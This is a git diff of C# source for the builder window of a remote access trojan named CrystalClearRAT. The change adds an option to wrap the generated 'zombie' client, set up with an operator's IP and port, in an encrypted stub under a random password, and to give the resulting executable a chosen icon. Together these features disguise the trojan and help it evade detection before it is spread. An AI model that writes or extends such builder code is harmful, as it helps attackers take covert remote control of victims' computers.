@@ -1,10 +1,12 @@
 ﻿using CrystalClearRAT.Helper;
+using CrystalClearRAT.Stub;
 using CrystalRATShared.Helper;
 using MahApps.Metro.Controls;
 using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.IO;
 using System.Linq;
 using System.Runtime.CompilerServices;
 using System.Text;
@@ -26,12 +28,13 @@ namespace CrystalClearRAT.Windows
     public partial class BuilderWindow : MetroWindow, INotifyPropertyChanged
     {
 
-        public string FilePath { get; private set; } = "No icon.";
+        public string IconFilePath { get; private set; } = "No icon.";
         public BuilderWindow()
         {
             DataContext = this;
             InitializeComponent();
-           
+            stubEncryptionPasswordTextBox.Text = Guid.NewGuid().ToString();
+
         }
 
         public event PropertyChangedEventHandler PropertyChanged;
@@ -46,14 +49,20 @@ namespace CrystalClearRAT.Windows
             }
             else if (string.IsNullOrWhiteSpace(portTextBox.Text))
             {
-                errorMsg = "Port cannot be empty";
+                errorMsg = "Port cannot be empty.";
+            }
+            else if (generateStubCheckbox.IsChecked == true && string.IsNullOrWhiteSpace(stubEncryptionPasswordTextBox.Text))
+            {
+                errorMsg = "Encryption password cannot be empty.";
             }
 
             if (errorMsg.Length > 0)
             {
-                MessageBox.Show("Error", errorMsg, MessageBoxButton.OK, MessageBoxImage.Error);
+                MessageBox.Show(errorMsg, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
             }
+
+
 
             SaveFileDialog dialog = new SaveFileDialog()
             {
@@ -62,11 +71,33 @@ namespace CrystalClearRAT.Windows
             // dialog.Filter = "Exe Files (.exe)|*.exe;
             if (dialog.ShowDialog() == true)
             {
-                ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), dialog.FileName);
+
+
+
+                if (generateStubCheckbox.IsChecked == true)
+                {
+                    if (!File.Exists(IconFilePath))
+                    {
+                        IconFilePath = null;
+                    }
+                    ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), "temp.exe");
+                    StubCompiler.Compile("temp.exe", stubEncryptionPasswordTextBox.Text, dialog.FileName, IconFilePath);
+                    File.Delete("temp.exe");
+                }
+                else
+                {
+
+                    ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), dialog.FileName);
+                    if (File.Exists(IconFilePath))
+                    {
+
+                        IconInjector.ChangeIcon(dialog.FileName, IconFilePath);
+                    }
+                }
             }
         }
 
-        private void selectIconButton_Click(object sender, RoutedEventArgs e)
+        private void SelectIconButton_Click(object sender, RoutedEventArgs e)
         {
             OpenFileDialog dialog = new OpenFileDialog()
             {
@@ -75,9 +106,11 @@ namespace CrystalClearRAT.Windows
 
             if (dialog.ShowDialog() == true)
             {
-                FilePath = dialog.FileName;
+                IconFilePath = dialog.FileName;
             }
 
+
+            //Console.WriteLine(IconFilePath);
         }
     }
 }
